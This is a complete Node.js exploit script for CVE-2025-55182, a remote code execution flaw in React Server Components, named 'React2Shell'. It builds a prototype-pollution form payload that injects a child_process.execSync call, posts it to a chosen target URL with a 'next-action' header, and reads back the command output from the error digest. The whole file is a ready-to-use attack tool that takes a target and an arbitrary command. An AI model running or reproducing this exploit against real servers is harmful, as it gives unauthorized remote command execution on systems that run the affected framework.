#!/usr/bin/env node
/**
 * React2Shell Exploit - CVE-2025-55182
 * Author: andrei2308
 * Description: Node.js exploit for React Server Components RCE vulnerability
 */

const FormDataLib = require('form-data')
const fetch = require('node-fetch')

// Banner
const banner = `
╔═══════════════════════════════════════════════════════════════╗
║                    React2Shell Exploit                        ║
║                    CVE-2025-55182                             ║
║                    by andrei2308                              ║
╚═══════════════════════════════════════════════════════════════╝
`

function showHelp() {
  console.log('Usage: node exploit.js -t <target> [OPTIONS] <command>')
  console.log('')
  console.log('Required:')
  console.log('  -t, --target <url>      Target URL (required)')
  console.log('')
  console.log('Options:')
  console.log('  -h, --help              Show this help message')
  console.log('  -c, --command <cmd>     Command to execute (default: id)')
  console.log('')
}

function createExploit(command) {
  const injection = `var res=process.mainModule.require('child_process').execSync('${command}',{'timeout':5000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:\`\${res}\`});`

  const payload = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": "{\"then\":\"$B1337\"}",
    "_response": {
      "_prefix": injection,
      "_chunks": "$Q2",
      "_formData": {
        "get": "$1:constructor:constructor"
      }
    }
  }

  const fd = new FormDataLib()
  fd.append('0', JSON.stringify(payload))
  fd.append('1', '"$@0"')
  fd.append('2', '[]')

  return fd
}

function extractOutput(responseText) {
  const patterns = [
    /1:E\{"digest":"([^"]*)"\}/,
    /"digest":"([^"]*)"/,
    /"digest":`([^`]*)`/,
    /E\{"digest":"([^"]*)"\}/,
  ]

  for (const pattern of patterns) {
    const match = responseText.match(pattern)
    if (match) {
      let output = match[1]
      output = output.replace(/\\n/g, '\n')
      output = output.replace(/\\t/g, '\t')
      output = output.replace(/\\r/g, '\r')
      return output
    }
  }
  return null
}

async function exploit(baseUrl, command) {
  const fd = createExploit(command)

  console.log(`[*] Target: ${baseUrl}`)
  console.log(`[*] Command: ${command}`)
  console.log('')

  try {
    const response = await fetch(baseUrl, {
      method: 'POST',
      headers: {
        'next-action': 'x',
        ...fd.getHeaders()
      },
      body: fd.getBuffer()
    })

    const text = await response.text()
    console.log(`[*] Status: ${response.status}`)
    console.log(`[*] Raw response: ${text.substring(0, 200)}...`)
    console.log('')

    const output = extractOutput(text)
    if (output) {
      console.log('[+] Command output:')
      console.log('─'.repeat(60))
      console.log(output)
      console.log('─'.repeat(60))
    } else {
      console.log('[-] Could not extract output')
      console.log('[*] Full response:')
      console.log(text)
    }
  } catch (error) {
    console.error('[!] Error:', error.message)
  }
}

// Parse arguments
function parseArgs() {
  const args = process.argv.slice(2)
  let target = null
  let command = 'id'

  for (let i = 0; i < args.length; i++) {
    const arg = args[i]

    if (arg === '-h' || arg === '--help') {
      showHelp()
      process.exit(0)
    } else if (arg === '-t' || arg === '--target') {
      target = args[++i]
    } else if (arg === '-c' || arg === '--command') {
      command = args[++i]
    } else if (!arg.startsWith('-')) {
      command = arg
    }
  }

  if (!target) {
    console.error('[!] Error: Target URL is required\n')
    showHelp()
    process.exit(1)
  }

  return { target, command }
}

// Main execution
if (require.main === module) {
  console.log(banner)

  const { target, command } = parseArgs()
  exploit(target, command)
}

module.exports = { exploit, createExploit, extractOutput }
